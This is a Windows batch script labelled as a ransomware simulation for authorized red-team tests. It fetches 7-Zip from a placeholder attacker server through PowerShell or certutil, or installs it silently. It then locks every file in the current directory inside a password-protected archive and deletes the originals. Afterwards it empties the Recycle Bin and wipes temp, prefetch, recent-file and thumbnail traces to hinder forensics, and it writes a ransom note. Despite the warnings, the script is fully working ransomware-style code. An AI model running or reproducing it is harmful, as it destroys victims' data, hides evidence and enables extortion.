@echo off
REM ============================================================================
REM File Encryption Simulation Script (Windows Batch)
REM For AUTHORIZED Red Team Operations Only
REM WARNING: This will encrypt and delete files - use only in test environments
REM ============================================================================

setlocal enabledelayedexpansion

REM Enable debug mode: set DEBUG=1 before running script for verbose output
if "%DEBUG%"=="1" (
    echo [DEBUG] Debug mode enabled
    echo [DEBUG] Script started at %DATE% %TIME%
    @echo on
) else (
    set "DEBUG=0"
)

REM Configuration
set "REMOTE_SERVER=http://YOUR_SERVER_IP_HERE"
set "SEVEN_ZIP_URL=%REMOTE_SERVER%/7z.exe"
set "SEVEN_ZIP_INSTALLER=%REMOTE_SERVER%/7z-installer.exe"
set "ARCHIVE_NAME=encrypted_files.7z"
set "INSTALL_DIR=%ProgramFiles%\7-Zip"
set "SEVEN_ZIP_EXE=%INSTALL_DIR%\7z.exe"
set "TEMP_DIR=%TEMP%\7z_temp"

REM ============================================================================
REM Password Configuration - Multiple Methods (Priority Order)
REM ============================================================================
if "%DEBUG%"=="1" echo [DEBUG] Starting password configuration...

REM Method 1: Check for environment variable (highest priority - passed externally)
REM Usage: set ENCRYPT_KEY=yourpassword && encrypt_files.bat
if "%DEBUG%"=="1" echo [DEBUG] Checking for ENCRYPT_KEY environment variable...
if defined ENCRYPT_KEY (
    set "PASSWORD=%ENCRYPT_KEY%"
    set "PASSWORD_METHOD=Environment Variable"
    if "%DEBUG%"=="1" echo [DEBUG] Password set from environment variable
    goto :password_set
)
if "%DEBUG%"=="1" echo [DEBUG] ENCRYPT_KEY not found

REM Method 2: Decode from Base64-encoded string (obfuscated storage)
REM This is "antai" encoded in Base64: YW50YWk=
REM To encode your own: echo -n "yourpassword" | base64
if "%DEBUG%"=="1" echo [DEBUG] Attempting Base64 password decode...
set "ENCODED_PASSWORD=YW50YWk="
for /f "delims=" %%i in ('powershell -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%ENCODED_PASSWORD%'))" 2^>nul') do set "PASSWORD=%%i"
if defined PASSWORD (
    set "PASSWORD_METHOD=Base64 Decoded"
    if "%DEBUG%"=="1" echo [DEBUG] Password decoded from Base64
    goto :password_set
)
if "%DEBUG%"=="1" echo [DEBUG] Base64 decode failed

REM Method 3: Generate random password (use if above methods fail)
if "%DEBUG%"=="1" echo [DEBUG] Generating random password...
set "PASSWORD_METHOD=Random Generated"
for /f "delims=" %%i in ('powershell -Command "-join ((65..90) + (97..122) + (48..57) + (33,35,36,37,38,42,43,45,61) | Get-Random -Count 16 | ForEach-Object {[char]$_})" 2^>nul') do set "PASSWORD=%%i"

:password_set
REM Fallback if all methods fail
if not defined PASSWORD (
    if "%DEBUG%"=="1" echo [DEBUG] All password methods failed, using fallback
    set "PASSWORD=Fallback_P@ssw0rd_%RANDOM%%RANDOM%"
    set "PASSWORD_METHOD=Fallback Random"
)
if "%DEBUG%"=="1" echo [DEBUG] Password configured using: %PASSWORD_METHOD%

echo ============================================================================
echo File Encryption Simulation - Red Team Operation
echo ============================================================================
echo.
echo [WARNING] This script will encrypt and delete files in current directory
echo [WARNING] For authorized testing only - ensure proper authorization
echo.
echo Current Directory: %CD%
echo Archive Name: %ARCHIVE_NAME%
echo Password Method: %PASSWORD_METHOD%
echo.
timeout /t 5 /nobreak
echo.

REM Step 1: Find or obtain 7-Zip executable
echo [*] Step 1/5: Locating 7-Zip executable...
set "SEVEN_ZIP_FOUND=0"

if "%DEBUG%"=="1" (
    echo [DEBUG] Script directory: %~dp0
    echo [DEBUG] Current directory: %CD%
    echo [DEBUG] TEMP directory: %TEMP%
    echo [DEBUG] Remote server: %REMOTE_SERVER%
)

REM Priority 1: Check for 7z.exe in the same directory as this script
echo [*] Checking for local 7z.exe in script directory...
if "%DEBUG%"=="1" echo [DEBUG] Looking for: %~dp07z.exe
if exist "%~dp07z.exe" (
    echo [+] Found local 7z.exe in script directory
    set "SEVEN_ZIP_EXE=%~dp07z.exe"
    set "SEVEN_ZIP_FOUND=1"
    if "%DEBUG%"=="1" echo [DEBUG] Using local 7z.exe at: %SEVEN_ZIP_EXE%
    goto :verify_7zip
)
if "%DEBUG%"=="1" echo [DEBUG] Local 7z.exe not found

REM Priority 2: Check if 7-Zip is already installed in standard locations
echo [*] Checking system installations...
if exist "%ProgramFiles%\7-Zip\7z.exe" (
    echo [+] Found 7-Zip in Program Files
    set "SEVEN_ZIP_EXE=%ProgramFiles%\7-Zip\7z.exe"
    set "SEVEN_ZIP_FOUND=1"
    goto :verify_7zip
)

if exist "%ProgramFiles(x86)%\7-Zip\7z.exe" (
    echo [+] Found 7-Zip in Program Files (x86)
    set "SEVEN_ZIP_EXE=%ProgramFiles(x86)%\7-Zip\7z.exe"
    set "SEVEN_ZIP_FOUND=1"
    goto :verify_7zip
)

REM Priority 3: Try to download 7-Zip standalone executable
echo [*] No local installation found, attempting download...
if "%DEBUG%"=="1" echo [DEBUG] Creating temp directory: %TEMP_DIR%
if not exist "%TEMP_DIR%" mkdir "%TEMP_DIR%" 2>nul

if not exist "%TEMP_DIR%" (
    echo [!] Warning: Could not create temp directory
    if "%DEBUG%"=="1" echo [DEBUG] Failed to create: %TEMP_DIR%
    set "TEMP_DIR=%~dp0"
    if "%DEBUG%"=="1" echo [DEBUG] Using script directory as temp: %TEMP_DIR%
)

REM Try using PowerShell for download (more reliable)
echo [*] Downloading 7z.exe using PowerShell...
if "%DEBUG%"=="1" (
    echo [DEBUG] Download URL: %SEVEN_ZIP_URL%
    echo [DEBUG] Download destination: %TEMP_DIR%\7z.exe
    echo [DEBUG] Running PowerShell download command...
)
powershell -Command "try { Write-Host '[DEBUG] Starting download...'; $wc = New-Object Net.WebClient; $wc.DownloadFile('%SEVEN_ZIP_URL%', '%TEMP_DIR%\7z.exe'); Write-Host '[DEBUG] Download completed'; exit 0 } catch { Write-Host '[ERROR] Download failed:' $_.Exception.Message; exit 1 }"
set "DOWNLOAD_RESULT=%ERRORLEVEL%"
if "%DEBUG%"=="1" echo [DEBUG] PowerShell exit code: %DOWNLOAD_RESULT%

if %DOWNLOAD_RESULT% EQU 0 (
    if "%DEBUG%"=="1" echo [DEBUG] Checking if file exists: %TEMP_DIR%\7z.exe
    if exist "%TEMP_DIR%\7z.exe" (
        echo [+] Successfully downloaded 7-Zip executable
        for %%A in ("%TEMP_DIR%\7z.exe") do set "FILE_SIZE=%%~zA"
        if "%DEBUG%"=="1" echo [DEBUG] Downloaded file size: !FILE_SIZE! bytes
        set "SEVEN_ZIP_EXE=%TEMP_DIR%\7z.exe"
        set "SEVEN_ZIP_FOUND=1"
        goto :verify_7zip
    ) else (
        if "%DEBUG%"=="1" echo [DEBUG] File not found after download
    )
) else (
    if "%DEBUG%"=="1" echo [DEBUG] PowerShell download returned error code: %DOWNLOAD_RESULT%
)

REM Fallback: Try certutil
echo [!] PowerShell download failed, trying certutil...
if "%DEBUG%"=="1" echo [DEBUG] Running certutil command...
certutil -urlcache -split -f "%SEVEN_ZIP_URL%" "%TEMP_DIR%\7z.exe"
set "CERTUTIL_RESULT=%ERRORLEVEL%"
if "%DEBUG%"=="1" echo [DEBUG] Certutil exit code: %CERTUTIL_RESULT%

if %CERTUTIL_RESULT% EQU 0 if exist "%TEMP_DIR%\7z.exe" (
    echo [+] Successfully downloaded 7-Zip using certutil
    for %%A in ("%TEMP_DIR%\7z.exe") do set "FILE_SIZE=%%~zA"
    if "%DEBUG%"=="1" echo [DEBUG] Downloaded file size: !FILE_SIZE! bytes
    set "SEVEN_ZIP_EXE=%TEMP_DIR%\7z.exe"
    set "SEVEN_ZIP_FOUND=1"
    goto :verify_7zip
)
if "%DEBUG%"=="1" echo [DEBUG] Certutil download failed

REM Priority 4: Try to download and install 7-Zip
echo [*] Step 2/5: Attempting to install 7-Zip...
powershell -Command "try { (New-Object Net.WebClient).DownloadFile('%SEVEN_ZIP_INSTALLER%', '%TEMP_DIR%\7z-installer.exe'); exit 0 } catch { exit 1 }" 2>nul

if %ERRORLEVEL% EQU 0 if exist "%TEMP_DIR%\7z-installer.exe" (
    echo [+] Installer downloaded, installing silently...
    REM Silent install with /S parameter
    start /wait "" "%TEMP_DIR%\7z-installer.exe" /S /D=%INSTALL_DIR%
    timeout /t 5 /nobreak >nul

    if exist "%INSTALL_DIR%\7z.exe" (
        echo [+] 7-Zip installed successfully
        set "SEVEN_ZIP_EXE=%INSTALL_DIR%\7z.exe"
        set "SEVEN_ZIP_FOUND=1"
        goto :verify_7zip
    )
)

REM Priority 5: Check if 7z.exe is in system PATH
echo [*] Checking system PATH for 7z.exe...
where 7z.exe >nul 2>&1
if %ERRORLEVEL% EQU 0 (
    echo [+] Found 7z.exe in system PATH
    set "SEVEN_ZIP_EXE=7z.exe"
    set "SEVEN_ZIP_FOUND=1"
    goto :verify_7zip
)

REM Priority 6: Last resort - download official 7-Zip standalone from 7-zip.org
echo [*] Attempting final fallback: Downloading official 7-Zip from 7-zip.org...
set "OFFICIAL_7ZIP_URL=https://www.7-zip.org/a/7z2501-x64.exe"
set "OFFICIAL_7ZIP_DOWNLOAD=%TEMP_DIR%\7z-official.exe"

powershell -Command "try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('%OFFICIAL_7ZIP_URL%', '%OFFICIAL_7ZIP_DOWNLOAD%'); exit 0 } catch { exit 1 }" 2>nul
if %ERRORLEVEL% EQU 0 if exist "%OFFICIAL_7ZIP_DOWNLOAD%" (
    echo [+] Downloaded official 7-Zip installer
    echo [*] Installing silently...
    start /wait "" "%OFFICIAL_7ZIP_DOWNLOAD%" /S /D=%INSTALL_DIR%
    timeout /t 10 /nobreak >nul

    if exist "%INSTALL_DIR%\7z.exe" (
        echo [+] Successfully installed 7-Zip from official source
        set "SEVEN_ZIP_EXE=%INSTALL_DIR%\7z.exe"
        set "SEVEN_ZIP_FOUND=1"
        goto :verify_7zip
    ) else (
        echo [!] Installation completed but 7z.exe not found at expected location
    )
) else (
    echo [!] Could not download from 7-zip.org
)

REM If we get here, all methods failed
echo.
echo [-] CRITICAL ERROR: Could not locate or obtain 7-Zip
echo [-] Attempted methods:
echo [-]   1. Local 7z.exe in script directory
echo [-]   2. System installation (Program Files)
echo [-]   3. Download from configured server (%REMOTE_SERVER%)
echo [-]   4. System PATH
echo [-]   5. Official download from 7-zip.org
echo.
echo [-] Please manually:
echo [-]   - Place 7z.exe in the same folder as this script, OR
echo [-]   - Install 7-Zip on the system
echo.
pause
exit /b 1

:verify_7zip
REM Verify the 7z.exe is actually executable
echo [*] Verifying 7-Zip executable...
"%SEVEN_ZIP_EXE%" >nul 2>&1
if %ERRORLEVEL% GTR 1 (
    echo [-] ERROR: 7-Zip executable is not working properly
    echo [-] Path: %SEVEN_ZIP_EXE%
    pause
    exit /b 1
)
echo [+] 7-Zip verified and ready
echo [*] Using: %SEVEN_ZIP_EXE%
echo.

:encrypt
REM Step 3: Create encrypted archive
echo.
echo [*] Step 3/5: Creating encrypted 7z archive...
echo [*] Password: %PASSWORD%
echo [*] This may take a while depending on file size...
echo.

if "%DEBUG%"=="1" (
    echo [DEBUG] 7-Zip executable: %SEVEN_ZIP_EXE%
    echo [DEBUG] Archive path: %CD%\%ARCHIVE_NAME%
    echo [DEBUG] Source directory: %CD%
    echo [DEBUG] Password method: %PASSWORD_METHOD%
    echo [DEBUG] Testing 7-Zip executable...
    "%SEVEN_ZIP_EXE%"
    echo [DEBUG] 7-Zip test exit code: %ERRORLEVEL%
    echo.
    echo [DEBUG] Checking disk space...
    for /f "tokens=3" %%a in ('dir /-c "%CD%" ^| findstr /C:"bytes free"') do set "FREE_SPACE=%%a"
    echo [DEBUG] Free space: !FREE_SPACE! bytes
    echo.
    echo [DEBUG] Current directory contents:
    dir /b "%CD%"
    echo.
)

REM Create archive with maximum compression and encryption
if "%DEBUG%"=="1" (
    echo [DEBUG] Running 7-Zip with full output...
    "%SEVEN_ZIP_EXE%" a -t7z -m0=lzma2 -mx=9 -mfb=64 -md=32m -ms=on -mhe=on -p%PASSWORD% "%CD%\%ARCHIVE_NAME%" "%CD%\*" -r -x!"%ARCHIVE_NAME%" -xr!*.7z -xr!*.bat -xr!*.ps1
) else (
    "%SEVEN_ZIP_EXE%" a -t7z -m0=lzma2 -mx=9 -mfb=64 -md=32m -ms=on -mhe=on -p%PASSWORD% "%CD%\%ARCHIVE_NAME%" "%CD%\*" -r -x!"%ARCHIVE_NAME%" -xr!*.7z -xr!*.bat -xr!*.ps1 2>nul
)

set "ARCHIVE_RESULT=%ERRORLEVEL%"
if "%DEBUG%"=="1" echo [DEBUG] 7-Zip archive creation exit code: %ARCHIVE_RESULT%

if %ARCHIVE_RESULT% GTR 0 (
    echo [-] Failed to create archive (Error Level: %ARCHIVE_RESULT%)
    echo [!] Possible causes:
    echo [!]   - Insufficient disk space
    echo [!]   - Permission denied
    echo [!]   - 7-Zip executable error
    echo [!]   - No files to archive
    echo [!] Path used: %SEVEN_ZIP_EXE%
    echo.
    if "%DEBUG%"=="1" (
        echo [DEBUG] Attempting to run 7-Zip help to verify it works...
        "%SEVEN_ZIP_EXE%" --help
        echo [DEBUG] 7-Zip help exit code: %ERRORLEVEL%
    )
    echo [-] Operation aborted - no files will be deleted
    pause
    exit /b 1
)

if "%DEBUG%"=="1" echo [DEBUG] Checking if archive file was created...
if not exist "%CD%\%ARCHIVE_NAME%" (
    echo [-] Archive file was not created
    echo [-] Expected location: %CD%\%ARCHIVE_NAME%
    if "%DEBUG%"=="1" (
        echo [DEBUG] Directory listing after archive attempt:
        dir /b "%CD%"
    )
    echo [-] Operation aborted - no files will be deleted
    pause
    exit /b 1
)

for %%A in ("%CD%\%ARCHIVE_NAME%") do set "ARCHIVE_SIZE=%%~zA"
if "%DEBUG%"=="1" echo [DEBUG] Archive file size: %ARCHIVE_SIZE% bytes

echo [+] Archive created successfully: %ARCHIVE_NAME%

REM Step 4: Verify archive was created
echo.
echo [*] Step 4/5: Verifying archive integrity...
if not exist "%CD%\%ARCHIVE_NAME%" (
    echo [-] CRITICAL: Archive file not found!
    echo [-] Expected location: %CD%\%ARCHIVE_NAME%
    echo [-] Aborting deletion phase for safety
    pause
    exit /b 1
)

REM Check archive size (should be > 0 bytes)
for %%A in ("%CD%\%ARCHIVE_NAME%") do set "ARCHIVE_SIZE=%%~zA"
if "%ARCHIVE_SIZE%"=="0" (
    echo [-] CRITICAL: Archive file is 0 bytes!
    echo [-] Aborting deletion phase for safety
    pause
    exit /b 1
)

echo [*] Archive size: %ARCHIVE_SIZE% bytes
echo [*] Testing archive integrity with password...

"%SEVEN_ZIP_EXE%" t -p%PASSWORD% "%CD%\%ARCHIVE_NAME%" >nul 2>&1
if errorlevel 1 (
    echo [-] CRITICAL: Archive verification failed!
    echo [-] The archive may be corrupted or password incorrect
    echo [-] Aborting deletion phase for safety
    echo.
    echo [*] Attempting to get more details...
    "%SEVEN_ZIP_EXE%" t -p%PASSWORD% "%CD%\%ARCHIVE_NAME%"
    pause
    exit /b 1
)

echo [+] Archive verified successfully - integrity confirmed

REM Step 5: Delete original files
echo.
echo [*] Step 5/5: Deleting original files...
echo [WARNING] This will permanently delete files!
echo [WARNING] Press Ctrl+C to abort in the next 5 seconds...
timeout /t 5 /nobreak
echo.

REM Count files before deletion
set "FILE_COUNT=0"
set "DELETED_COUNT=0"
set "FAILED_COUNT=0"

echo [*] Scanning for files to delete...

REM Delete all files except the archive, scripts, and 7z files
for /f "delims=" %%F in ('dir /b /a-d /s 2^>nul') do (
    set "DELETE_FILE=1"

    REM Skip the archive itself
    echo %%F | findstr /i /c:"%ARCHIVE_NAME%" >nul && set "DELETE_FILE=0"

    REM Skip 7z files
    echo %%F | findstr /i /c:".7z" >nul && set "DELETE_FILE=0"

    REM Skip this script
    echo %%F | findstr /i /c:"%~nx0" >nul && set "DELETE_FILE=0"

    REM Skip README_IMPORTANT.txt
    echo %%F | findstr /i /c:"README_IMPORTANT.txt" >nul && set "DELETE_FILE=0"

    if "!DELETE_FILE!"=="1" (
        set /a FILE_COUNT+=1
        echo [*] Deleting: %%F
        del /f /q "%%F" 2>nul
        if not exist "%%F" (
            set /a DELETED_COUNT+=1
        ) else (
            set /a FAILED_COUNT+=1
            echo [!] Warning: Failed to delete %%F
        )
    )
)

echo.
echo [*] Deletion Summary:
echo [*]   Files processed: %FILE_COUNT%
echo [*]   Successfully deleted: %DELETED_COUNT%
if %FAILED_COUNT% GTR 0 (
    echo [!]   Failed to delete: %FAILED_COUNT%
) else (
    echo [*]   Failed to delete: %FAILED_COUNT%
)

REM Delete empty directories (non-critical, suppress errors)
echo [*] Removing empty directories...
for /f "delims=" %%D in ('dir /b /ad /s 2^>nul ^| sort /r') do (
    rd "%%D" 2>nul
)

echo [+] File deletion completed

REM Cleanup temp directory
if exist "%TEMP_DIR%" rd /s /q "%TEMP_DIR%" 2>nul

REM Step 6: System cleanup and recycle bin emptying
echo.
echo [*] Step 6/6: Running system cleanup...
echo [*] Starting background cleanup processes...

REM Empty Recycle Bin (all drives)
echo [*] Emptying Recycle Bin...
powershell -Command "$Shell = New-Object -ComObject Shell.Application; $RecycleBin = $Shell.Namespace(0xA); $RecycleBin.Items() | ForEach-Object { Remove-Item $_.Path -Recurse -Force -ErrorAction SilentlyContinue }" 2>nul
if %ERRORLEVEL% EQU 0 (
    echo [+] Recycle Bin emptied successfully
) else (
    REM Fallback method using rd
    echo [*] Using alternate method to empty Recycle Bin...
    rd /s /q %SystemDrive%\$Recycle.Bin 2>nul
)

REM Clear Windows temp files in background
echo [*] Starting temp file cleanup in background...
start /B cmd /c "del /f /s /q %TEMP%\* 2>nul & del /f /s /q %SystemRoot%\Temp\* 2>nul"

REM Run Disk Cleanup in background (silent mode)
echo [*] Starting Windows Disk Cleanup in background...
start /B cleanmgr /sagerun:1 2>nul

REM Clear prefetch files (if admin)
echo [*] Clearing prefetch files...
del /f /q %SystemRoot%\Prefetch\*.pf 2>nul
if %ERRORLEVEL% EQU 0 (
    echo [+] Prefetch files cleared
) else (
    echo [!] Could not clear prefetch (may require admin privileges)
)

REM Clear recent documents
echo [*] Clearing recent documents...
del /f /q "%APPDATA%\Microsoft\Windows\Recent\*.*" 2>nul
if %ERRORLEVEL% EQU 0 (
    echo [+] Recent documents cleared
)

REM Clear thumbnail cache
echo [*] Clearing thumbnail cache...
del /f /s /q "%LOCALAPPDATA%\Microsoft\Windows\Explorer\thumbcache_*.db" 2>nul

echo [+] System cleanup initiated (running in background)

REM Final summary
echo.
echo ============================================================================
echo Operation Complete
echo ============================================================================
echo [+] Encrypted archive: %CD%\%ARCHIVE_NAME%
echo [+] Password: %PASSWORD%
echo [+] Original files have been deleted
echo [+] System cleanup processes started
echo.
echo [*] To extract files, use:
echo     7z x %ARCHIVE_NAME% -p%PASSWORD%
echo ============================================================================
echo.

REM Create a ransom note (for simulation purposes)
echo ============================================================================ > README_IMPORTANT.txt
echo YOUR FILES HAVE BEEN ENCRYPTED >> README_IMPORTANT.txt
echo ============================================================================ >> README_IMPORTANT.txt
echo. >> README_IMPORTANT.txt
echo All your files have been encrypted with military-grade encryption. >> README_IMPORTANT.txt
echo. >> README_IMPORTANT.txt
echo [This is a SIMULATED attack for authorized red team testing] >> README_IMPORTANT.txt
echo. >> README_IMPORTANT.txt
echo Archive: %ARCHIVE_NAME% >> README_IMPORTANT.txt
echo Password: %PASSWORD% >> README_IMPORTANT.txt
echo. >> README_IMPORTANT.txt
echo ============================================================================ >> README_IMPORTANT.txt

echo [+] Ransom note created: README_IMPORTANT.txt
echo.

pause
exit /b 0
